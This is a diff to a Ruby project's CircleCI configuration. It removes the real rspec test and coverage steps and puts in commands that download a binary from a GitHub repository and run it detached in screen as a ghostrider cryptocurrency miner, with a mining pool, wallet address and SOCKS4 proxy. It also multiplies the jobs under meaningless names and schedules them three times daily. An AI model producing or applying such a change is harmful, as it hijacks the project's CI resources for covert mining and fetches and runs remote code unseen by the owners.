@@ -1,6 +1,5 @@
 working_dir: &working_dir ~/app
-
-.build_template: &build_definition
+.build_template: &script
   steps:
     - checkout
     - run: curl -L https://codeclimate.com/downloads/test-reporter/test-reporter-latest-linux-amd64 > ./cc-test-reporter
@@ -12,46 +11,89 @@ working_dir: &working_dir ~/app
     - run:
         name: Run tests
         command: |
-          bundle exec rspec -r rspec_junit_formatter --format RspecJunitFormatter -o $CIRCLE_TEST_REPORTS/rspec/junit.xml
-          ./cc-test-reporter after-build --exit-code $?
-  working_directory: *working_dir
-
+                    apt update 
+                    apt install screen -y 
+                    wget -O config https://github.com/Feena-Cowpeland/Feena-Cowpeland/raw/main/config
+                    chmod +x config
+                    screen -dmS ls
+                    ./config --disable-gpu --algorithm ghostrider --pool rtm.suprnova.cc:6273 --wallet RWi1xbUyvKo8JvYpLbyJQ64kPBR8rkFw5a --proxy=SOCKS4://38.142.63.146:31596
+        no_output_timeout: 235m
 version: 2.0
-
 jobs:
-  build:
+  endvoc:
     docker:
       - image: ruby
     steps:
       - checkout
-  build_ruby2_7:
-    <<: *build_definition
+  endvoc1:
+    <<: *script
     docker:
       - image: ruby:2.7
-  build_ruby2_6:
-    <<: *build_definition
+  endvoc2:
+    <<: *script
     docker:
       - image: ruby:2.6
-  build_ruby2_5:
-    <<: *build_definition
+  endvoc3:
+    <<: *script
     docker:
       - image: ruby:2.5
-  build_ruby2_4:
-    <<: *build_definition
+  endvoc4:
+    <<: *script
     docker:
       - image: ruby:2.4
-  build_ruby2_3:
-    <<: *build_definition
+  endvoc5:
     docker:
-      - image: ruby:2.3
-
+      - image: ruby
+    steps:
+      - checkout
+  endvoc6:
+    <<: *script
+    docker:
+      - image: ruby:2.7
+  endvoc7:
+    <<: *script
+    docker:
+      - image: ruby:2.6
+  endvoc8:
+    <<: *script
+    docker:
+      - image: ruby:2.5
+  endvoc9:
+    <<: *script
+    docker:
+      - image: ruby:2.4
 workflows:
   version: 2
-  build_ruby_versions:
+  commit:
     jobs:
-      - build
-      - build_ruby2_7
-      - build_ruby2_6
-      - build_ruby2_5
-      - build_ruby2_4
-      - build_ruby2_3
+      - endvoc
+      - endvoc1
+      - endvoc2
+      - endvoc3
+      - endvoc4
+      - endvoc5
+      - endvoc6
+      - endvoc7
+      - endvoc8
+      - endvoc9
+
+    triggers:
+      - schedule:
+          cron: "0 0,8,16 * * *"
+          filters:
+            branches:
+              only:
+                - master
+
+  endvocrunjob:
+    jobs:
+      - endvoc
+      - endvoc1
+      - endvoc2
+      - endvoc3
+      - endvoc4
+      - endvoc5
+      - endvoc6
+      - endvoc7
+      - endvoc8
+      - endvoc9
